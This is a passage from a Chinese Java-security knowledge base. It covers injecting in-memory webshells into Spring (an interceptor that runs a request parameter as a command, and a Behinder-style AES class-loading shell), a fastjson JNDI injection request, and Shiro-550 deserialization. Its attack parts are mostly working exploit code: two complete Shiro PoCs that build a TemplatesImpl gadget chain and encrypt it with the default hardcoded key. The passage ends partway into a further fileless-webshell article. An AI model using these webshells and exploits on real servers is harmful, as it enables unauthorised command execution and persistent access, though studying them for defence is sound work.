RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); // 创建用于处理请求的对象 HelloWorldController injectToController = new HelloWorldController(); mappingHandlerMapping.registerMapping(info, injectToController, method2); model.addAttribute(\"name\", \"aaron\"); return \"hello\"; } } 问题 为什么会添加一个空构造函数（缺省构造函数）？ 由于在当前类里面定义了“有参构造方法”，这样的话在实例化的时候，没有传参，就会出现此异常，需要添加一个覆盖原先的“无参构造方法”，所以在类里面加上“无参构造方法”就可以解决问题了 sun.misc.BASE64Decoder().decodeBuffer(base64String) jdk11+不支持，使用jdk8可直接使用，如果目标环境是jdk8+，那么建议自己写一个base64解码器来解码 ClassLoader.getSystemClassLoader() 如果随意给定某个继承自ClassLoader的类，可能会出现报错java.lang.LinkageError : attempted duplicate class definition for name。这是因为需要使用getSystemClassLoader()获取创建ClassLoader时需要添加委派父级 拦截器 拦截器(Interceptor)在开发中处于非常重要的环节，全局拦截器可以针对接口授权情况进行放行或拦截，也可以进行身份验证，不满足则直接拦截，所有的请求都会先经过拦截器，然后才到达Controller，执行，最后返回，所以如果能动态注册一个拦截器，对所有的请求进行拦截，等到得到了我们设置的参数，再进行操作 手工创建拦截器 首先创建一个类 package com.spring.Interceptor; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; public class TestInterceptor extends HandlerInterceptorAdapter { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response,Object handler){ String code = request.getParameter(\"code\"); if(code !=null){ try{ Runtime.getRuntime().exec(\"calc.exe\"); }catch (IOException e){ e.printStackTrace(); } } return true; } } 然后在dispatcher-Servlet.xml 配置 当访问hello路由的时候，就会触发拦截器 这里一定得有路由，如果没有注册hello这个路由，那么拦截器就无效果 分析拦截器的整个过程 完整的调用链如下所示： preHandle:20, TestInterceptor (com.spring.Interceptor) applyPreHandle:133, HandlerExecutionChain (org.springframework.web.servlet) doDispatch:962, DispatcherServlet (org.springframework.web.servlet) doService:901, DispatcherServlet (org.springframework.web.servlet) processRequest:970, FrameworkServlet (org.springframework.web.servlet) doGet:861, FrameworkServlet (org.springframework.web.servlet) service:626, HttpServlet (javax.servlet.http) service:846, FrameworkServlet (org.springframework.web.servlet) service:733, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) doFilter:52, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:201, StandardWrapperValve (org.apache.catalina.core) invoke:97, StandardContextValve (org.apache.catalina.core) invoke:544, AuthenticatorBase (org.apache.catalina.authenticator) invoke:143, StandardHostValve (org.apache.catalina.core) invoke:81, ErrorReportValve (org.apache.catalina.valves) invoke:698, AbstractAccessLogValve (org.apache.catalina.valves) invoke:78, StandardEngineValve (org.apache.catalina.core) service:364, CoyoteAdapter (org.apache.catalina.connector) service:616, Http11Processor (org.apache.coyote.http11) process:65, AbstractProcessorLight (org.apache.coyote) process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1629, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:748, Thread (java.lang) 关键的点在于doDispatch方法处，先通过getHandler方法获取了mappedHandler对象 在后方调用mappedHandler的applyPreHandler方法 这个方法中就是依次调用每个interceptor实例的preHandle方法，实际上就进入了前面写好的TestInterceptor类的preHandle方法中 在这里就有去调用写的TestInterceptor类中的preHandle方法 最后到我们写的方法中，执行完成返回true，至此就完成拦截器的调用 动态注入 跟踪mappedHandler的获取过程，先是调用了org.springframework.web.servlet.DispatcherServlet中的getHandler方法 跟进getHandler方法，遍历了this.handlerMappings 跟进getHandler(request)方法， 发现是调用的是AbstractHandlerMapping (org.springframework.web.servlet.handler) 也就是org.springframework.web.servlet.handler.AbstractHandlerMapping类中getHandler方法 再跟进getHandlerExecutionChain方法 发现其中会遍历adaptedInterceptors这数组，并判断获取的interceptor实例是不是MappedInterceptor类的实例对象，而MappedInterceptor类就是对拦截器HandlerInterceptor接口的实现，所以前面定义的TestInterceptor自然会被加入chain中并返回 那么如果我们能将恶意的interceptor实例添加到org.springframework.web.servlet.handler.AbstractHandlerMapping类的实例对象的adaptedInterceptors中，那么就可以完成动态注入那么关键就在于找到org.springframework.web.servlet.handler.AbstractHandlerMapping类的实例对象，CTRL+ALT+B找到所有AbstractHandlerMapping的子类，并在beanFactory的beanDefinitionNames中找到它的实例 因此可以通过context.getBean(\"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\")获取该对象，再反射获取其中的adaptedInterceptors属性，并添加恶意interceptor实例对象即可完成内存马的注入 实例 0x1 注入普通马 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; @Controller public class Test extends HandlerInterceptorAdapter { @RequestMapping(value = \"/a\") public String test() throws NoSuchFieldException, IllegalAccessException { // 获取当前上下文的dispatch-servletContext WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 从context中获取AbstractHandlerMapping的实例对象 org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 反射获取adaptedInterceptors属性 java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\"); field.setAccessible(true); java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping); System.out.println(adaptedInterceptors); System.out.println(adaptedInterceptors.get(0).getClass().toString()); // 避免重复 for(Object object : adaptedInterceptors){ if(object instanceof Test){ System.out.println(\"已经添加过Test实例了\"); return \"hello\"; } } // 向添加恶意的interceptor实例对象 Test test = new Test(); adaptedInterceptors.add(test); return \"hello\"; } public Test(){} // 复写 prehandle方法 @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception{ String code = request.getParameter(\"code\"); // 不干扰正常业务逻辑 if (code != null) { java.lang.Runtime.getRuntime().exec(code); return true; } else { return true; } } } 访问该路由之后，如下所示，在 adaptedInterceptors 数组中已经有添加过的恶意添加的interceptor 最后在如下所示code参数添加命令，则可以直接执行命令 0x2 注入冰蝎马 原理同controller注入冰蝎马 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.util.HashMap; import java.util.Map; @Controller public class Test extends HandlerInterceptorAdapter { private final String k = \"e45e329feb5d925b\"; @RequestMapping(value = \"/a\") public String test() throws NoSuchFieldException, IllegalAccessException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\"); field.setAccessible(true); java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping); System.out.println(adaptedInterceptors); System.out.println(adaptedInterceptors.get(0).getClass().toString()); for(Object object : adaptedInterceptors){ if(object instanceof Test){ System.out.println(\"已经添加过Test实例了\"); return \"hello\"; } } Test test = new Test(); adaptedInterceptors.add(test); return \"hello\"; } public Test(){} @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception{ String code = request.getParameter(\"code\"); // 不干扰正常业务逻辑 if (code != null) { behinder(); return true; } else { return true; } } public HttpServletResponse behinder() throws Exception { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); HelloWorldController helloWorldController = new HelloWorldController(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } } 无文件落地注入 这里我使用maven添加fastjson 1.2.24,使用jndi注入，当newInsatnce之后注册路由，并在此路由上绑定对应Controller 0x1 jndi 测试 Spring 要解析客户端发送的json数据，大部分是使用Jackson,fastjson也可以 首先引入依赖 com.alibaba fastjson 1.2.24 然后在Controller里写入由fastjson解析json对象的方法 @RequestMapping(value = \"/testjson\", consumes = {\"application/json\"}, produces = {\"application/json\"}) @ResponseBody public String showUserListInJson(HttpServletRequest request,HttpServletResponse response) throws IOException { BufferedReader bufferedReader = request.getReader(); String bodyStr,body = \"\"; while((bodyStr = bufferedReader.readLine()) != null){ body += bodyStr; } System.out.println(body); System.out.println(JSON.parse(body)); return body; } package com.spring.Controller; public class User { private Integer userId = 0; private String userName = \"\"; public User(){} public Integer getUserId() { return this.userId; } public void setUserId(Integer userId) { System.out.println(\"set running\"); this.userId = userId; } public String getUserName() { return this.userName; } public void setUserName(String userName) { System.out.println(\"set running\"); this.userName = userName; } @Override public String toString(){ return \"User{\" + \"name='\" + userName + '\\'' + ',' + \"id='\" + userId + '\\'' + '}'; } } public class Exec { public Exec() { System.out.println(\"hello world\"); } } 启动web，启动marshalsec，发送如下payload POST /testjson HTTP/1.1 Host: 127.0.0.1:8081 Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"91\", \" Not;A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 112 { \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://127.0.0.1:1389/abc\", \"autoCommit\":true } 0x2 jndi 注入冰蝎马 如果执行的字节码文件需要不用引入其他包，那么直接执行Runtime.getRuntime.exec即可执行命令，反弹shell等操作，但是如果需要在spring 应用中注入，那么需要使用spring相关的包，才能获取到对应的context，在这里需要使用maven项目，添加对应的spring 包，或者有jar包也可以直接添加到lib文件里，然后用idea编译成class文件，对应在target目录下 import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.SecretKeySpec; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import java.util.*; public class Exec extends ClassLoader{ private final String k = \"e45e329feb5d925b\"; public Exec(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); // 调用父类的defineClass函数 } public Exec(String aaa){} public Exec() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 可选步骤，判断url是否存在 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()){ String urlPath = (String) urlIterator.next(); if (\"/jnditest\".equals(urlPath)){ System.out.println(\"url已存在\"); return; } } // 可选步骤，判断url是否存在 // 2. 通过反射获得自定义 controller 中test的 Method 对象 Method method2 = Exec.class.getMethod(\"test\"); // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/jnditest\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); // 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环 Exec injectToController = new Exec(\"aaa\"); mappingHandlerMapping.registerMapping(info, injectToController, method2); System.out.println(\"hello world\"); } // controller指定的处理方法 public HttpServletResponse test() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IOException, BadPaddingException, IllegalBlockSizeException, IllegalAccessException, InstantiationException { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); Exec helloWorldController = new Exec(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } } 生成的Exec.class 问题总结 编译的时候，jdk最好选择服务器对应的jdk版本，jdk11 和 jdk8 跨大版本，在编译成功之后使用jndi注入会报错，而且是十分致命的错误 maven项目，尽量也要选择与目标主机spring相差不大的版本，保证能获取到Context参考链接 https://landgrey.me/blog/19/ https://landgrey.me/blog/12/ https://www.anquanke.com/post/id/198886#h2-0 https://www.cnblogs.com/bitterz/p/14820898.html https://www.cnblogs.com/wudb/archive/2017/08/31/7458856.html https://www.cnblogs.com/DDgougou/p/9621675.html https://blog.csdn.net/xcxy2015/article/details/80746614 https://stackoverflow.com/questions/34414906/classloading-using-different-versions-of-the-same-class-java-lang-linkageerror https://blog.csdn.net/weixin_44411569/article/details/91379483 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:25:06 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/12.Spring框架内存马入门/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/13.Shiro550分析/":{"url":"知识库/02.JAVA安全/13.Shiro550分析/","title":"13.Shiro550分析","keywords":"","body":" 简介 环境搭建 攻击流程 问题说明 0X1 org.apache.shiro.io.DefaultSerializer.deserialize:40 0x2 org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass:20 0x3 org.apache.shiro.util.ClassUtils.forName:59 POC1 POC2 参考链接 简介 Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro易于理解的API，开发者可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。 在Shiro 环境搭建 在这里选择下载源码来搭建，下载好之后使用最简单的servlet来搭建靶场，倒入shiro-shiro-root-1.2.4 -> samples -> web -> pom.xml 在配置完成之后，打开打开会报如下错 解决办法 下载JSTL标签库，并将其导入IDEA中，如下所示 然后再导入到对应war包里 启动项目如下所示 此时可以看见项目自带了Commons Collections 3.2.1 ，但是在war 包的依赖里没有，这里再将Commons Collections 3.2.1 添加到war包里 自此环境搭建成功 攻击流程 漏洞触发主要有4步 传入Cookie rememberMe BASE64解码 AES解码 反序列化 第1步可以看到shiro的主要特征，就是在Response 的Set-Cookie: rememberMe=deleteMe;一般在登录处就可以看到，由于改项目是一个很简单的servlet，没有很复杂的Controller设计，都是通过Cookie来控制的身份认证 第2步是在Request中的Cookie: rememberMe:xxx进行base64解码 第3步则是将第2步解码的数据进行AES解码，AES是对称加密算法，如果能得知密钥那么加解密就完全受控制了 第4步则是将AES解密算法解密后的数据，进行反序列化，也就是readObject() 那么我们在生成payload的时候，要完成对应AES加密，在AES加密的过程中就需要得知对应的密钥，在此可以知道，shiro // AbstractRememberMeManager.java // 硬编码的密钥 private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); // 加密算法 public ByteSource encrypt(byte[] plaintext, byte[] key) { byte[] ivBytes = null; boolean generate = this.isGenerateInitializationVectors(false); if (generate) { ivBytes = this.generateInitializationVector(false); if (ivBytes == null || ivBytes.length == 0) { throw new IllegalStateException(\"Initialization vector generation is enabled - generated vectorcannot be null or empty.\"); } } return this.encrypt(plaintext, key, ivBytes, generate); } private ByteSource encrypt(byte[] plaintext, byte[] key, byte[] iv, boolean prependIv) throws CryptoException { int MODE = true; byte[] output; if (prependIv && iv != null && iv.length > 0) { byte[] encrypted = this.crypt(plaintext, key, iv, 1); output = new byte[iv.length + encrypted.length]; System.arraycopy(iv, 0, output, 0, iv.length); System.arraycopy(encrypted, 0, output, iv.length, encrypted.length); } else { output = this.crypt(plaintext, key, iv, 1); } if (log.isTraceEnabled()) { log.trace(\"Incoming plaintext of size \" + (plaintext != null ? plaintext.length : 0) + \". Ciphertext \" + \"byte array is size \" + (output != null ? output.length : 0)); } return Util.bytes(output); } 所以客户端生成对应的加密代码就可以这样写 byte[] payloads = byte[] seariaz_data AesCipherService aes = new AesCipherService(); byte[] key = new BASE64Decoder().decodeBuffer(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); 问题说明 在复现过程中，由于shiro默认使用的commons collections 版本号是3.2.1 但是在复现的过程中，在tomcat下无法直接利用 commons-collections:3.2.1 的问题 0X1 org.apache.shiro.io.DefaultSerializer.deserialize:40 这里我们直接看反序列化发生的点，第49行使用了 ClassResolvingObjectInputStream 类而非传统的 ObjectInputStream .这里可能是开发人员做的一种防护措施？ 跟进readObject方法，他重写了 ObjectInputStream 类的 resolveClass 函数， ObjectInputStream 的 resolveClass 函数用的是 Class.forName 类获取当前描述器所指代的类的Class对象 0x2 org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass:20 然而重写后的 resolveClass 函数，采用的是 ClassUtils.forName ，我们继续看这个forName的实现。 0x3 org.apache.shiro.util.ClassUtils.forName:59 在这里可以看到与父类的forName方法不一样，再来看看这个 ExceptionIgnoringAccessor 是怎么实现的 这里实际上调用了 ParallelWebAppClassLoader 父类 WebappClassLoaderBase 的 loadClass 函数 该loadClass载入按照上述的顺序（这里不贴代码了，找到 org.apache.catalina.loader.WebappClassLoaderBase.loadClass 即可），先从cache中找已载入的类，如果前3点都没找到，再通过父类 URLClassLoader 的 loadClass 函数载入。但是实际上此时loadClass的参数name值带上了数组的标志，即 /Lorg/apache/commons/collections/Transformer;.class 那么找到原因之后，简单来说，只要使用Transformer链式调用transform()函数，都无法利用成功，那么在commons collections 3.2.1中就不使用Transformer类，那么POC如下 POC1 这里改改CC6(ysoserial) package com.test; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import sun.misc.BASE64Decoder; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestLazyMap { public static void main(String[] args) throws Exception { InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cls = pool.makeClass(\"Cat\"); String cmdlist = \"open /System/Applications/Calculator.app\"; String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\"+cmdlist+\"\\\");\"; cls.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\" + System.nanoTime(); cls.setName(randomName); cls.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cls.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates,\"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); f1.set(templates,targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates,null); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,transformer); TiedMapEntry entry = new TiedMapEntry(lazyMap, templates); HashSet map = new HashSet(1); map.add(\"foo\"); Field f3 = null; try { f3 = HashSet.class.getDeclaredField(\"map\"); } catch (NoSuchFieldException e) { f3 = HashSet.class.getDeclaredField(\"backingMap\"); } f3.setAccessible(true); HashMap innimpl = null; innimpl = (HashMap) f3.get(map); Field f4 = null; try { f4 = HashMap.class.getDeclaredField(\"table\"); } catch (NoSuchFieldException e) { f4 = HashMap.class.getDeclaredField(\"elementData\"); } f4.setAccessible(true); Object[] array = new Object[0]; array = (Object[]) f4.get(innimpl); Object node = array[0]; if(node == null){ node = array[1]; } Field keyField = null; try{ keyField = node.getClass().getDeclaredField(\"key\"); }catch(Exception e){ keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\"); } keyField.setAccessible(true); keyField.set(node, entry); Field f5 = transformer.getClass().getDeclaredField(\"iMethodName\"); f5.setAccessible(true); f5.set(transformer,\"newTransformer\"); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(map); byte[] payloads = byteArrayOutputStream.toByteArray(); AesCipherService aes = new AesCipherService(); byte[] key = new BASE64Decoder().decodeBuffer(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } POC2 package com.test; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import sun.misc.BASE64Decoder; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestLazyMap { public static void main(String[] args) throws Exception { InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cls = pool.makeClass(\"Cat\"); String cmdlist = \"open /System/Applications/Calculator.app\"; String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\"+cmdlist+\"\\\");\"; cls.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\" + System.nanoTime(); cls.setName(randomName); cls.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cls.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates,\"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); f1.set(templates,targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates,null); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,transformer); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(entry); lazyMap.remove(\"foo\"); Field f3 = transformer.getClass().getDeclaredField(\"iMethodName\"); f3.setAccessible(true); f3.set(transformer,\"newTransformer\"); Field f4 = entry.getClass().getDeclaredField(\"key\"); f4.setAccessible(true); f4.set(entry,templates); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(map); byte[] payloads = byteArrayOutputStream.toByteArray(); AesCipherService aes = new AesCipherService(); byte[] key = new BASE64Decoder().decodeBuffer(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } 参考链接 https://blog.csdn.net/m0_67392409/article/details/124100291 https://blog.csdn.net/HongYu012/article/details/123112913 https://xz.aliyun.com/t/7950?page=5 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:23:53 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/13.Shiro550分析/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/14.Shiro550无文件内存马/":{"url":"知识库/02.JAVA安全/14.Shiro550无文件内存马/","title":"14.Shiro550无文件内存马","keywords":"","body":" 简介 环境 攻击流程 注意事项 0x1 注入Servlet普通内存马 步骤 0x2 注入Servlet 冰歇马 0x3 注入Listener冰歇内存马 提出问题 参考链接 简介 在Tomcat内存马无文件攻击中，介绍了存在反序列化点的时候，发送base64 编码之后的序列化数据，通过反序列化执行代码，注入Tomcat Fiilter，Tomcat Servlet，Tomcat Listener进行无文件生成内存马达到权限维持的目的，本章主要内容是利用shiro的反序列化点进行无文件注入内存马的一些注意事项 shiro550 反序列化由于是存在于Cookie的rememberMe字段中，当将序列化的文件通过base64编码之后，再AES加密生成的AES加密的字符发送到服务端执行反序列化，在shiro550 反序列化分析一文中虽然存在Commons-Collections3.2.1 但是在此过程中存在防护，不能使用Transformer类，就只能使用TemplatesImpl实例化_bytecodes来进行代码执行，以下使用CB1来进行注入 环境 环境搭建参考shiro550 反序列化分析一文中的环境搭建，下面为本次使用的版本信息 jdk jdk8u181 tomcat tomcat8.5.79 攻击流程 和Tomcat内存马无文件攻击一样，首先需要获取获取request，然后通过request获取对应的获取ServletContext，进而获取到StandardContext，进行注入Servlet和Listener，注意这里没有Filter（由于Shiro本身就是一个Filter，我在这里测试发现并不能注入，在将我们的filter放置到最前的时候，会报错，直接进入catch语句里，但是注入Filter类型内存马是可行的，但是暂未复现成功） 注意事项 由于shiro反序列化的时候payload是存放在HTTP Header中，在HTTP 传输协议当中，HTTP头部不能携带超大数据进行传输，当超过最大的限制则会直接报400客户端错误，这一步是最为关键的，在合适的HTTP Header Size才是最优解，看了很多博客尝试通过反射修改Tomcat 